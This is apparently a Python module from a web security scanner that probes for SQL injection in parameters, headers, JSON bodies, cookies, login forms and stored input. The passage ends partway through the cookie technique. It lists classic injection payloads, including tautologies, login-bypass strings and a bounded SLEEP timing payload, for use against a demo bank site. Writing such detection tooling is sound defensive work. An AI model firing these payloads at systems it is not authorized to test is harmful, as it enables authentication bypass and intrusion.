"""Layer 9 — `stof/modules/sqli_tests.py`: SQL Injection (TC-127).

Wave 2's first injection module. Safety boundary is deliberate and
mirrors `deserialization_tests.py`'s own "candidate-detect vs.
auto-exploit" line: this module signals that an injection point
*exists*, it never extracts, dumps, or claims to have read real data.
Every technique's `Finding.response_raw` carries truncated evidence of
the *signal observed* (an error fingerprint, a response differential,
a timing delta) -- never a claim of actual extracted data. No
UNION-based data pull, no destructive statement (DROP/DELETE/UPDATE/
INSERT) is ever constructed here.

- **TC-127.1 error-based**: a small set of syntax-breaking strings
  (`'`, `"`, `' OR '1'='1`, ...) into every discovered query/body
  parameter, flagged only on a real DB-error fingerprint (MySQL/
  Postgres/MSSQL/Oracle/SQLite driver signature) in the response --
  never a bare status-code check.
- **TC-127.2 boolean-based blind**: a true-condition / false-condition
  payload pair per parameter, diffed against an unmodified baseline
  using a similarity ratio (`_injection_shared.response_similarity`),
  not exact-hash equality -- see that function's own docstring for why
  a hash comparison is the wrong tool for a real dynamic page.
- **TC-127.3 time-based blind**: exactly ONE payload, capped at a 2
  second sleep -- never longer, and only re-tried once (to require a
  *repeatable* delta, not one-off network jitter) before it's ever
  reported. This runs against `demo.testfire.net`, a real shared
  demo server; an unbounded or repeated-without-limit sleep payload
  here would be a DoS risk against a target this project doesn't own.
- **TC-127.4 login-bypass**: the technique this project's own gap
  analysis specifically flagged -- `auth_tests.py`'s only
  default-credentials technique (TC-022.1) posts JSON to
  `login_json_endpoint`, so it silently never exercises a real HTML
  login form (`uid`/`passw` POST, this target's actual login). This
  technique finds that form itself from the crawler's discovered
  endpoints and tries a short list of classic auth-bypass payloads in
  the username/password fields, confirmed only via an
  actually-authenticated-looking result (a redirect away from the
  login page, or a logged-in-only marker in the response body) -- not
  a bare HTTP 200, since a rejected login commonly re-renders the same
  login page with a 200 status.
- **TC-127.5 header-based**: the same TC-127.1 error-based payloads and
  `looks_like_sql_error()` fingerprint, but placed into a request
  HEADER (`User-Agent`/`X-Forwarded-For`/`Referer`) instead of the
  query/body -- a real, documented injection point (request logging,
  geo/IP lookups) `_injection_shared.send_probe`'s new optional
  `extra_headers` parameter makes reachable without touching any
  existing call site's behavior.
- **TC-127.6 second-order**: a two-act plant/verify technique -- a
  benign error-triggering payload is planted into a free-text-shaped
  POST field (comment/feedback/etc.) via a low-priv authenticated
  context, then a SEPARATE, higher-privileged authenticated context
  checks whether a different, likely-privileged endpoint's response
  later shows a DB-error fingerprint when it reads that stored value
  back. Error-based signal only (no time-based second-order --
  attributing a timing delta correctly across two separate requests
  over a gap is unreliable). The plant phase is a real POST, gated
  behind `SqliTestConfig.allow_state_changing_probes`, same convention
  as every other write-verb technique in this codebase.
- **TC-127.7 JSON-body**: every technique above sends params as a
  query string or an `application/x-www-form-urlencoded` body --
  `_injection_shared.send_probe` never sent a JSON body. Most modern
  REST/JSON APIs are exactly as injectable as a form-encoded endpoint,
  just via a different `Content-Type`; a scanner that never sends a
  JSON body silently never exercises that surface at all. Reuses the
  SAME TC-127.1 error-based payload set and `looks_like_sql_error()`
  fingerprint -- only the delivery mechanism (`send_probe`'s new
  `json_body` flag) is new. Targets discovered endpoints with
  `endpoint_type == "api"` and a body-bearing method
  (POST/PUT/PATCH) that carry at least one parameter -- this project's
  crawler doesn't yet tag a precise Content-Type per endpoint, so this
  is a best-effort, honestly-labeled heuristic for "looks like a JSON
  API", not a certainty; it skips cleanly when no such endpoint was
  discovered.
- **TC-127.8 cookie-based**: the same shape as TC-127.5, but the
  injection point is a request COOKIE instead of a header --
  `send_probe`'s new `extra_cookies` parameter serializes a full
  cookie set (with one entry overridden to the payload) into an
  explicit `Cookie` header. Deliberately scoped to cookies the
  authenticated role's OWN session already carries (`Session.cookies`
  from Layer 5), and deliberately EXCLUDES any cookie whose name looks
  like the actual session/auth token (`_AUTH_COOKIE_NAME_HINTS`) --
  this only tests a cookie the tester is already authorized to hold
  and control, never a session token that isn't this project's own to
  tamper with. Skips cleanly when the role's session carries no
  non-auth cookie to test. Reuses the TC-127.1 error-based payload set
  and `looks_like_sql_error()` unchanged.
"""
from __future__ import annotations

from dataclasses import dataclass
from typing import TYPE_CHECKING

from stof.core.logger import get_logger
from stof.findings.models import Finding
from stof.payloads.generators import StaticValueGenerator
from stof.payloads.models import ProbeContext
from stof.payloads.registry import PayloadRegistry

from ._injection_shared import (
    _second_order_plant_candidates,
    _second_order_verify_candidates,
    build_params,
    injectable_endpoints,
    looks_json_authenticated,
    looks_like_sql_error,
    placeholder_value,
    response_similarity,
    send_probe,
)
from .base import _PASSWORD_FIELD_HINTS, _USERNAME_FIELD_HINTS, VulnModule, find_login_endpoint
from .results import ERROR, FAIL, PASS, SKIPPED, TestCaseResult, extract_findings

if TYPE_CHECKING:
    from stof.crawler.endpoint_store import Endpoint
    from stof.engine.multi_session import SessionPool
    from stof.evidence.collector import EvidenceCollector
    from stof.session.session_manager import SessionManager

_log = get_logger("modules.sqli_tests")

# `_SQL_ERROR_FINGERPRINTS`/`looks_like_sql_error()` moved to
# `_injection_shared.py` (Batch: TC-057.8) so `jwt_tests.py`'s kid-header
# SQLi-signal technique can reuse the exact same fingerprint oracle
# without duplicating it -- pure code motion, imported above unchanged.

# TC-127.1 -- small, syntax-breaking, non-destructive. Registered
# through the payload engine (`PayloadRegistry`/`StaticValueGenerator`)
# following `idor_tests.py`'s own candidate-value pattern, not a bare
# module-level tuple read directly.
_ERROR_BASED_PAYLOADS = ("'", "\"", "' OR '1'='1", "'--", "')--", "1' AND '1'='1")

# TC-127.2 -- one true-condition, one false-condition payload. Index
# order matters here (see `_technique_boolean_blind`): registered as a
# 2-value family rather than tagged Payloads, since this is a fixed
# pair, not an open candidate list.
_BOOLEAN_TRUE_PAYLOAD = "' OR '1'='1'-- -"
_BOOLEAN_FALSE_PAYLOAD = "' AND '1'='2'-- -"

# TC-127.3 -- exactly one payload, one engine syntax (MySQL-style
# SLEEP). Per this module's safety boundary: ONE bounded-delay payload,
# never more, never longer than the cap below. A payload this project
# doesn't recognize as valid syntax for the target's actual DB engine
# simply errors out harmlessly (feeding TC-127.1's signal instead, if
# anything) rather than posing any real risk.
_TIME_BASED_PAYLOAD = "' OR SLEEP(2)-- -"
_TIME_BASED_DELAY_S = 2.0
# Comfortably below the 2s cap (network jitter tolerance) but high
# enough that an ordinary fast response can't cross it by accident.
_TIME_BASED_DELTA_THRESHOLD_S = 1.5

# TC-127.4 -- classic auth-bypass shapes. `pass_payload` is a benign
# filler in most pairs (`'--`-style payloads comment out the password
# check entirely, so the password value itself doesn't matter); a few
# pairs also inject in the password field for a target that validates
# username first.
_LOGIN_BYPASS_PAYLOADS: tuple[tuple[str, str], ...] = (
    ("' OR '1'='1'-- -", "stof-probe"),
    ("admin'-- -", "stof-probe"),
    ("' OR 1=1-- -", "' OR 1=1-- -"),
    ("admin' OR '1'='1", "admin' OR '1'='1"),
)

# A response containing one of these (and the baseline "definitely
# wrong credentials" response not also containing it) is the "looks
# authenticated" signal for TC-127.4 -- deliberately generic wording,
# not this target's own copy, so the technique isn't hardcoded to one
# app's UI text.
_AUTH_SUCCESS_MARKERS = ("logout", "log out", "sign out", "signout", "welcome", "my account", "dashboard", "account summary")

# TC-127.5 -- headers commonly logged, geolocated, or otherwise queried
# against by real applications (see `sqli_knowledge_base.json`'s
# `header_based` pattern). Reuses `_ERROR_BASED_PAYLOADS`/
# `looks_like_sql_error()` unchanged -- only the injection POINT is new.
_HEADER_INJECTION_CANDIDATES = ("User-Agent", "X-Forwarded-For", "Referer")

# TC-127.6 -- `_looks_like_free_text_field`, `_second_order_plant_candidates`,
# and `_second_order_verify_candidates` (plus their `_FREE_TEXT_FIELD_HINTS`/
# `_PRIVILEGED_PATH_HINTS` hint tuples) were promoted to `_injection_shared.py`
# so `xss_tests.py`'s TC-128.4 stored-XSS technique can reuse them without
# duplication -- imported above, pure code motion, zero behavior change here.

# TC-127.7 -- no new payload design: reuses `_ERROR_BASED_PAYLOADS`/
# `looks_like_sql_error()` unchanged, only `send_probe`'s new `json_body`
# delivery mechanism is new.

# TC-127.8 -- cookie-name hints for the "is this the real session/auth
# cookie" exclusion. Deliberately broad/conservative (a false positive
# here just means one fewer cookie gets tested, never a false negative
# that would let this technique tamper with a real auth token) --
# mirrors the same "err on the side of not touching it" posture as
# `_PASSWORD_FIELD_HINTS`'s own hint-matching precedent in this module.
_AUTH_COOKIE_NAME_HINTS = (
    "session", "jsession", "phpsess", "connect.sid", "auth", "token", "jwt", "csrf", "sid",
)


def controllable_cookie_names(cookies: dict[str, str]) -> list[str]:
    """The subset of a session's own cookies that are safe/authorized
    for TC-127.8 to inject a payload into -- every name that does NOT
    look like the actual session/auth token (`_AUTH_COOKIE_NAME_HINTS`).
    Returns `[]` when the session carries no cookie at all, or when
    every cookie it carries looks like a session/auth token -- the
    technique's clean-skip case, never a reason to fall back to testing
    the auth cookie itself."""
    return [name for name in cookies if not any(hint in name.lower() for hint in _AUTH_COOKIE_NAME_HINTS)]


def looks_authenticated(
    payload_status: int, payload_headers: dict, payload_body: str,
    baseline_status: int, baseline_headers: dict, baseline_body: str,
) -> bool:
    """Heuristic "this response looks like a successful login", not
    just HTTP 200 -- a login form very commonly answers both a correct
    and an incorrect submission with 200 (re-rendering an error
    message on the same page). Either of two independent signals is
    enough: (1) a redirect (30x) to a URL that doesn't itself look
    like the login page again, when the baseline (definitely-wrong
    credentials) request did NOT redirect there -- a genuine login
    normally 30x's to a logged-in landing page, a rejected one
    re-renders the login form; (2) the response body newly contains a
    logged-in-only marker ("logout", "welcome", "dashboard", ...) that
    the baseline response lacked."""
    payload_location = (payload_headers or {}).get("location", "")
    baseline_location = (baseline_headers or {}).get("location", "")
    redirected_to_new_place = (
        300 <= payload_status < 400
        and payload_location
        and "log" not in payload_location.lower().rsplit("/", 1)[-1]
        and payload_location != baseline_location
    )
    payload_lower, baseline_lower = payload_body.lower(), baseline_body.lower()
    new_success_marker = any(m in payload_lower and m not in baseline_lower for m in _AUTH_SUCCESS_MARKERS)
    return bool(redirected_to_new_place) or new_success_marker or looks_json_authenticated(payload_body, baseline_body)


@dataclass
class SqliTestConfig:
    low_priv_role: str = "normal"
    target_url: str | None = None
    # (endpoint, param) pairs probed by the error-based/boolean-blind
    # techniques -- bounds total request volume against a real target
    # (O(endpoints x params), unlike a fixed-size wordlist), same
    # reasoning as every other capped candidate sweep in this project.
    max_probe_targets: int = 15
    # Tighter cap for the time-based technique specifically: each
    # candidate can cost up to ~2 x 2s = 4s (baseline + payload,
    # doubled again on a repeat-to-confirm hit) -- kept small
    # deliberately so this technique's worst-case added scan time
    # stays bounded and DoS-safe against a shared demo target.
    max_time_based_targets: int = 5
    # TC-127.5 -- bounded set of discovered endpoints probed with each
    # of `_HEADER_INJECTION_CANDIDATES`; same capping convention as
    # `max_time_based_targets` above.
    max_header_probe_targets: int = 5
    # TC-127.7 -- bounded set of discovered JSON-API-shaped endpoints;
    # same capping convention as `max_header_probe_targets` above.
    max_json_probe_targets: int = 5
    # TC-127.8 -- bounded set of discovered endpoints probed with each
    # authorized-controllable cookie found on the role's own session;
    # same capping convention as `max_header_probe_targets` above.
    max_cookie_probe_targets: int = 5
    # TC-127.6 -- bounded plant-phase and verify-phase candidate counts;
    # total probe volume is bounded at their product (see
    # `_technique_second_order`'s own docstring).
    max_second_order_plant_targets: int = 3
    max_second_order_verify_targets: int = 3
    # The verify phase reads back stored content through a SEPARATE,
    # higher-privileged authenticated context (the real AltoroMutual
    # feedback-reviewed-by-admin shape) -- defaults to "admin" the same
    # way every other module here defaults its high-priv role.
    high_priv_role: str = "admin"
    # Gates the second-order plant phase's real POST -- same convention
    # every other write-verb technique in this codebase already uses
    # (`IdorTestConfig`/`AuthTestConfig`/`CsrfTestConfig`). Wired from
    # `config.testing.allow_state_changing_probes` in `main.py`'s
    # `_build_module_builders()`.
    allow_state_changing_probes: bool = False


class SqliTestsModule(VulnModule):
    module_id = "sqli_tests"
    name = "SQL Injection Tests"
    phase = 1

    def __init__(self, config: SqliTestConfig | None = None) -> None:
        self.config = config or SqliTestConfig()
        self.payload_registry = PayloadRegistry()
        self._register_payloads()

    def _register_payloads(self) -> None:
        self.payload_registry.register_all(list(
            StaticValueGenerator("TC-127.1", "error_based", _ERROR_BASED_PAYLOADS, contexts=("query", "form")).generate()
        ))
        self.payload_registry.register_all(list(
            StaticValueGenerator(
                "TC-127.2", "boolean_blind", (_BOOLEAN_TRUE_PAYLOAD, _BOOLEAN_FALSE_PAYLOAD), contexts=("query", "form"),
            ).generate()
        ))

    def _error_based_payloads(self) -> list[str]:
        context = ProbeContext(testcase_id="TC-127.1", location="query")
        return [str(p.value) for p in self.payload_registry.for_context(context)]

    def _boolean_blind_payloads(self) -> tuple[str, str]:
        """(true_payload, false_payload) -- registration order from
        `_register_payloads()` is the contract here, not a tag lookup:
        a fixed 2-value pair, not an open candidate list."""
        context = ProbeContext(testcase_id="TC-127.2", location="query")
        values = [str(p.value) for p in self.payload_registry.for_context(context)]
        return values[0], values[1]

    def _result(
        self, technique_id: str, technique: str, vuln_type: str, status: str, detail: str,
        role: "str | None" = None, endpoint=None, finding: "Finding | None" = None,
    ) -> TestCaseResult:
        return self._make_result(
            test_id="TC-127", technique_id=technique_id, technique=technique, vuln_type=vuln_type,
            status=status, detail=detail, role=role, endpoint=endpoint, finding=finding,
        )

    async def run(self, endpoints, session_manager, session_pool, evidence=None) -> list[Finding]:
        return extract_findings(await self.run_techniques(endpoints, session_manager, session_pool, evidence))

    def _param_candidates(self, endpoints: "list[Endpoint]") -> list[tuple["Endpoint", str, str]]:
        candidates: list[tuple[Endpoint, str, str]] = []
        for endpoint in injectable_endpoints(endpoints):
            for name in endpoint.parameters:
                candidates.append((endpoint, name, endpoint.location_for(name)))
        return candidates

    def _finding(
        self, endpoint: "Endpoint", vuln_type: str, param: str, description: str,
        request_preview: str, response_preview: str, severity: str = "Critical", cvss_score: float = 9.1,
    ) -> Finding:
        return Finding(
            module_id=self.module_id, vuln_type=vuln_type, severity=severity, cvss_score=cvss_score,
            endpoint=endpoint, user_role=self.config.low_priv_role,
            request_raw=request_preview, response_raw=response_preview[:300],
            description=description,
            recommendation="Use parameterized queries/prepared statements for every database call; never build SQL from unsanitized request input.",
        )

    async def _technique_error_based(
        self, candidates: list[tuple["Endpoint", str, str]], context, evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-127.1", "Error-based SQL injection (DB error fingerprint in response)"
        vuln_type = "SQL Injection (error-based)"
        if not candidates:
            return self._result(tid, technique, vuln_type, SKIPPED, "no query/body parameter discovered to probe")

        payloads = self._error_based_payloads()
        bounded = candidates[: self.config.max_probe_targets]
        for endpoint, param, location in bounded:
            for payload_value in payloads:
                probe = await send_probe(context, endpoint, build_params(endpoint, param, payload_value), location)
                if probe is None:
                    continue
                status, body, _elapsed, _headers = probe
                fingerprint = looks_like_sql_error(body)
                if fingerprint is None:
                    continue
                description = (
                    f"Injecting {payload_value!r} into parameter '{param}' ({location}) on "
                    f"{endpoint.method} {endpoint.url} produced a database-error fingerprint "
                    f"('{fingerprint}') in the response (HTTP {status}) -- the injected value "
                    "reached the SQL layer unsanitized. This is a candidate signal only: no "
                    "data was extracted or altered."
                )
                finding = self._finding(
                    endpoint, vuln_type, param, description,
                    request_preview=f"{endpoint.method} {endpoint.url}\n{param}={payload_value!r}", response_preview=body,
                )
                finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label=f"sqli-error-{param}") if evidence else []
                return self._result(tid, technique, vuln_type, FAIL, description, role=self.config.low_priv_role, endpoint=endpoint, finding=finding)
        return self._result(
            tid, technique, vuln_type, PASS,
            f"{len(bounded)} parameter(s) probed with {len(payloads)} error-triggering payload(s) each, no DB error fingerprint observed",
            role=self.config.low_priv_role,
        )

    async def _boolean_blind_candidate(self, endpoint: "Endpoint", param: str, location: str, context, true_payload: str, false_payload: str):
        """One (endpoint, param)'s baseline/true/false probe triple --
        extracted so `_technique_boolean_blind` stays orchestration
        only. Returns `None` if any of the three probes failed
        (unprobeable candidate, try the next one), else `(baseline_body,
        true_body, false_body, true_status)`."""
        baseline = await send_probe(context, endpoint, build_params(endpoint, param, placeholder_value(param)), location)
        true_probe = await send_probe(context, endpoint, build_params(endpoint, param, true_payload), location)
        false_probe = await send_probe(context, endpoint, build_params(endpoint, param, false_payload), location)
        if baseline is None or true_probe is None or false_probe is None:
            return None
        return baseline[1], true_probe[1], false_probe[1], true_probe[0]

    async def _technique_boolean_blind(
        self, candidates: list[tuple["Endpoint", str, str]], context, evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-127.2", "Boolean-based blind SQL injection (true/false response differential)"
        vuln_type = "SQL Injection (boolean-based blind)"
        if not candidates:
            return self._result(tid, technique, vuln_type, SKIPPED, "no query/body parameter discovered to probe")

        true_payload, false_payload = self._boolean_blind_payloads()
        bounded = candidates[: self.config.max_probe_targets]
        for endpoint, param, location in bounded:
            probed = await self._boolean_blind_candidate(endpoint, param, location, context, true_payload, false_payload)
            if probed is None:
                continue
            baseline_body, true_body, false_body, true_status = probed
            sim_true = response_similarity(baseline_body, true_body)
            sim_false = response_similarity(baseline_body, false_body)
            # The differential oracle: a TRUE condition should read
            # like the unmodified baseline (the WHERE clause still
            # matches something real), a FALSE condition should read
            # meaningfully differently (an empty/error result) -- see
            # `response_similarity`'s own docstring for why a graded
            # ratio, not exact-hash equality, is the right comparison.
            if sim_true >= 0.90 and (sim_true - sim_false) >= 0.15:
                description = (
                    f"Parameter '{param}' ({location}) on {endpoint.method} {endpoint.url}: a "
                    f"true-condition SQLi payload's response was {sim_true:.0%} similar to the "
                    f"unmodified baseline, while a false-condition payload's response was only "
                    f"{sim_false:.0%} similar (HTTP {true_status} on the true-condition probe) -- "
                    "a response differential consistent with the injected condition reaching the "
                    "SQL WHERE clause. This is a candidate signal only: no data was extracted."
                )
                finding = self._finding(
                    endpoint, vuln_type, param, description,
                    request_preview=f"{endpoint.method} {endpoint.url}\n{param}={true_payload!r} (true) vs {param}={false_payload!r} (false)",
                    response_preview=true_body,
                )
                finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label=f"sqli-boolean-{param}") if evidence else []
                return self._result(tid, technique, vuln_type, FAIL, description, role=self.config.low_priv_role, endpoint=endpoint, finding=finding)
        return self._result(
            tid, technique, vuln_type, PASS,
            f"{len(bounded)} parameter(s) probed with a true/false payload pair each, no meaningful response differential observed",
            role=self.config.low_priv_role,
        )

    async def _time_based_candidate(self, endpoint: "Endpoint", param: str, location: str, context) -> "float | None":
        """One (endpoint, param)'s baseline-then-payload timing delta,
        or `None` if either probe failed. Extracted so
        `_technique_time_based` stays orchestration only."""
        baseline = await send_probe(context, endpoint, build_params(endpoint, param, placeholder_value(param)), location)
        if baseline is None:
            return None
        payload_probe = await send_probe(context, endpoint, build_params(endpoint, param, _TIME_BASED_PAYLOAD), location)
        if payload_probe is None:
            return None
        return payload_probe[2] - baseline[2]

    async def _technique_time_based(
        self, candidates: list[tuple["Endpoint", str, str]], context, evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-127.3", f"Time-based blind SQL injection (one {_TIME_BASED_DELAY_S:.0f}s-capped payload)"
        vuln_type = "SQL Injection (time-based blind)"
        if not candidates:
            return self._result(tid, technique, vuln_type, SKIPPED, "no query/body parameter discovered to probe")

        bounded = candidates[: self.config.max_time_based_targets]
        for endpoint, param, location in bounded:
            delta = await self._time_based_candidate(endpoint, param, location, context)
            if delta is None or delta < _TIME_BASED_DELTA_THRESHOLD_S:
                continue
            # Require the delay to repeat once before reporting it --
            # a single slow response is exactly as likely to be network
            # jitter as a real injected sleep; see the module docstring
            # for why this technique caps at one bounded payload and
            # one confirmation, not an open-ended retry loop.
            confirm_delta = await self._time_based_candidate(endpoint, param, location, context)
            if confirm_delta is None or confirm_delta < _TIME_BASED_DELTA_THRESHOLD_S:
                continue
            description = (
                f"Injecting a bounded {_TIME_BASED_DELAY_S:.0f}s SQL sleep payload into parameter "
                f"'{param}' ({location}) on {endpoint.method} {endpoint.url} added a repeatable "
                f"~{min(delta, confirm_delta):.2f}s of response latency compared to a baseline "
                "request -- a timing signal consistent with the injected value reaching the "
                "database layer. This is a candidate signal only: no data was extracted, and the "
                "sleep payload used is capped and was never repeated beyond this one confirmation."
            )
            finding = self._finding(
                endpoint, vuln_type, param, description,
                request_preview=f"{endpoint.method} {endpoint.url}\n{param}={_TIME_BASED_PAYLOAD!r}",
                response_preview=f"observed delta: first={delta:.2f}s, confirm={confirm_delta:.2f}s",
            )
            finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label=f"sqli-time-{param}") if evidence else []
            return self._result(tid, technique, vuln_type, FAIL, description, role=self.config.low_priv_role, endpoint=endpoint, finding=finding)
        return self._result(
            tid, technique, vuln_type, PASS,
            f"{len(bounded)} parameter(s) probed with one {_TIME_BASED_DELAY_S:.0f}s-capped sleep payload each, no repeatable timing delta observed",
            role=self.config.low_priv_role,
        )

    async def _technique_login_bypass(
        self, endpoints: "list[Endpoint]", session_pool: "SessionPool", evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-127.4", "SQL injection login-form authentication bypass"
        vuln_type = "SQL Injection (login bypass)"
        login_endpoint = find_login_endpoint(endpoints)
        if login_endpoint is None:
            return self._result(
                tid, technique, vuln_type, SKIPPED,
                "no discovered POST endpoint has both a username-shaped and a password-shaped "
                "parameter -- no HTML login form found to probe (this technique specifically "
                "targets the real HTML login form, not a JSON login API)",
            )
        username_param = next(p for p in login_endpoint.parameters if any(h in p.lower() for h in _USERNAME_FIELD_HINTS))
        password_param = next(p for p in login_endpoint.parameters if any(h in p.lower() for h in _PASSWORD_FIELD_HINTS))
        location = login_endpoint.location_for(username_param)

        anon_context = await session_pool.new_anonymous_context()
        try:
            baseline_params = {n: placeholder_value(n) for n in login_endpoint.parameters}
            baseline_params[username_param] = "stof-nonexistent-user"
            baseline_params[password_param] = "definitely-Wrong-Pw1!"
            baseline = await send_probe(anon_context, login_endpoint, baseline_params, location)
            if baseline is None:
                return self._result(tid, technique, vuln_type, ERROR, "baseline login probe failed (network/request error) -- could not test", endpoint=login_endpoint)
            baseline_status, baseline_body, _elapsed, baseline_headers = baseline

            for user_payload, pass_payload in _LOGIN_BYPASS_PAYLOADS:
                params = {n: placeholder_value(n) for n in login_endpoint.parameters}
                params[username_param] = user_payload
                params[password_param] = pass_payload
                probe = await send_probe(anon_context, login_endpoint, params, location)
                if probe is None:
                    continue
                status, body, _elapsed, headers = probe
                if not looks_authenticated(status, headers, body, baseline_status, baseline_headers, baseline_body):
                    continue
                description = (
                    f"POSTing the SQLi auth-bypass payload {user_payload!r} in field '{username_param}' "
                    f"(with {pass_payload!r} in '{password_param}') to {login_endpoint.url} produced an "
                    f"authenticated-looking response (HTTP {status}) -- a redirect away from the login "
                    "page or a logged-in-only marker not present in a definitely-wrong-credentials "
                    "baseline response. This indicates the login query is built from unsanitized "
                    "input; no account data was read or altered beyond this login attempt."
                )
                finding = self._finding(
                    login_endpoint, vuln_type, username_param, description,
                    request_preview=f"POST {login_endpoint.url}\n{username_param}={user_payload!r}&{password_param}=***",
                    response_preview=body, cvss_score=9.8,
                )
                finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label="sqli-login-bypass") if evidence else []
                return self._result(tid, technique, vuln_type, FAIL, description, role="unauthenticated", endpoint=login_endpoint, finding=finding)
            return self._result(
                tid, technique, vuln_type, PASS,
                f"{len(_LOGIN_BYPASS_PAYLOADS)} SQLi auth-bypass payload(s) tried against the login form, none produced an authenticated-looking response",
                role="unauthenticated", endpoint=login_endpoint,
            )
        finally:
            await anon_context.close()

    async def _technique_header_based(
        self, endpoints: "list[Endpoint]", context, evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-127.5", "Header-based SQL injection (payload in User-Agent/X-Forwarded-For/Referer)"
        vuln_type = "SQL Injection (header-based)"
        if not endpoints:
            return self._result(tid, technique, vuln_type, SKIPPED, "no discovered endpoint to probe")

        payloads = self._error_based_payloads()
        bounded = endpoints[: self.config.max_header_probe_targets]
        for endpoint in bounded:
            params = {name: placeholder_value(name) for name in endpoint.parameters}
            location = "query" if endpoint.method.upper() == "GET" else "body"
            for header_name in _HEADER_INJECTION_CANDIDATES:
                for payload_value in payloads:
                    probe = await send_probe(context, endpoint, params, location, extra_headers={header_name: payload_value})
                    if probe is None:
                        continue
                    status, body, _elapsed, _headers = probe
                    fingerprint = looks_like_sql_error(body)
                    if fingerprint is None:
                        continue
                    description = (
                        f"Injecting {payload_value!r} into the '{header_name}' request header on "
                        f"{endpoint.method} {endpoint.url} produced a database-error fingerprint "
                        f"('{fingerprint}') in the response (HTTP {status}) -- the header value "
                        "reached the SQL layer unsanitized (e.g. via request logging or geo/IP "
                        "lookup). This is a candidate signal only: no data was extracted or altered."
                    )
                    finding = self._finding(
                        endpoint, vuln_type, header_name, description,
                        request_preview=f"{endpoint.method} {endpoint.url}\n{header_name}: {payload_value!r}", response_preview=body,
                    )
                    finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label=f"sqli-header-{header_name}") if evidence else []
                    return self._result(tid, technique, vuln_type, FAIL, description, role=self.config.low_priv_role, endpoint=endpoint, finding=finding)
        return self._result(
            tid, technique, vuln_type, PASS,
            f"{len(bounded)} endpoint(s) probed with {len(_HEADER_INJECTION_CANDIDATES)} header(s) x "
            f"{len(payloads)} error-triggering payload(s) each, no DB error fingerprint observed",
            role=self.config.low_priv_role,
        )

    def _json_body_candidates(self, endpoints: "list[Endpoint]") -> "list[Endpoint]":
        """Discovered endpoints that look like a JSON API surface --
        `endpoint_type == "api"` (Wave 1's own crawl-time classification,
        not a guess this module invents) on a body-bearing method, with
        at least one parameter to inject into. This project's crawler
        doesn't yet capture a precise per-endpoint Content-Type, so this
        is a best-effort heuristic, not a certainty every match truly
        accepts JSON -- honestly labeled as such in TC-127.7's own
        SKIPPED/description text, not silently assumed."""
        return [
            e for e in endpoints
            if e.endpoint_type == "api" and e.method.upper() in ("POST", "PUT", "PATCH") and e.parameters
        ]

    async def _technique_json_body(
        self, endpoints: "list[Endpoint]", context, evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-127.7", "JSON-body SQL injection (payload in a JSON request body parameter)"
        vuln_type = "SQL Injection (JSON-body)"
        candidates = self._json_body_candidates(endpoints)
        if not candidates:
            return self._result(
                tid, technique, vuln_type, SKIPPED,
                "no discovered API endpoint (endpoint_type=='api', method POST/PUT/PATCH, with at "
                "least one parameter) found to send a JSON body to -- this technique specifically "
                "targets JSON-API-shaped endpoints, already-covered form-encoded endpoints are TC-127.1's job",
            )

        payloads = self._error_based_payloads()
        bounded = candidates[: self.config.max_json_probe_targets]
        for endpoint in bounded:
            for param in endpoint.parameters:
                for payload_value in payloads:
                    params = build_params(endpoint, param, payload_value)
                    probe = await send_probe(context, endpoint, params, "body", json_body=True)
                    if probe is None:
                        continue
                    status, body, _elapsed, _headers = probe
                    fingerprint = looks_like_sql_error(body)
                    if fingerprint is None:
                        continue
                    description = (
                        f"Sending a JSON body with {payload_value!r} in field '{param}' to "
                        f"{endpoint.method} {endpoint.url} (Content-Type: application/json) produced "
                        f"a database-error fingerprint ('{fingerprint}') in the response (HTTP "
                        f"{status}) -- the JSON field value reached the SQL layer unsanitized, the "
                        "same as a form-encoded parameter would. This is a candidate signal only: no "
                        "data was extracted or altered."
                    )
                    finding = self._finding(
                        endpoint, vuln_type, param, description,
                        request_preview=f"{endpoint.method} {endpoint.url}\nContent-Type: application/json\n{{\"{param}\": {payload_value!r}}}",
                        response_preview=body,
                    )
                    finding.evidence_refs = await evidence.capture_raw(finding.request_raw, finding.response_raw, label=f"sqli-json-{param}") if evidence else []
                    return self._result(tid, technique, vuln_type, FAIL, description, role=self.config.low_priv_role, endpoint=endpoint, finding=finding)
        return self._result(
            tid, technique, vuln_type, PASS,
            f"{len(bounded)} JSON-API-shaped endpoint(s) probed with {len(payloads)} error-triggering "
            "payload(s) per parameter, no DB error fingerprint observed",
            role=self.config.low_priv_role,
        )

    async def _technique_cookie_based(
        self, endpoints: "list[Endpoint]", session, context, evidence: "EvidenceCollector | None",
    ) -> TestCaseResult:
        tid, technique = "TC-127.8", "Cookie-based SQL injection (payload in an authorized, non-auth cookie already set by this session)"
        vuln_type = "SQL Injection (cookie-based)"
        if not endpoints:
            return self._result(tid, technique, vuln_type, SKIPPED, "no discovered endpoint to probe")

        controllable = controllable_cookie_names(session.cookies)
        if not controllable:
            return self._result(
                tid, technique, vuln_type, SKIPPED,
                f"role '{self.config.low_priv_role}'s session carries no non-session/auth cookie -- "
                "nothing authorized-controllable to inject a payload into (this technique never "
                "tampers with the actual session/auth cookie)",
                role=self.config.low_priv_role,
            )

        payloads = self._error_based_payloads()
        bounded = endpoints[: self.config.max_cookie_probe_targets]
        for endpoint in bounded:
            params = {name: placeholder_value(name) for name in endpoint.parameters}
            location = "query" if endpoint.method.upper() == "GET" else "body"
            for cookie_name in controllable:
                for payload_value in payloads:
                    cookie_override = {**session.cookies, cookie_name: payload_value}
                    probe = await send_probe(context, endpoint, params, location, extra_cookies=cookie_override)
                    if probe is None:
                        continue
                    status, body, _elapsed, _headers = probe
                    fingerprint = looks_like_sql_error(body)
                    if fingerprint is None:
                        continue
                    description = (
                        f"Injecting {payload_value!r} into the '{cookie_name}' cookie (a cookie this "
                        f"role's own authenticated session already carries, not the session/auth "
                        f"cookie itself) on {endpoint.method} {endpoint.url} produced a database-error "
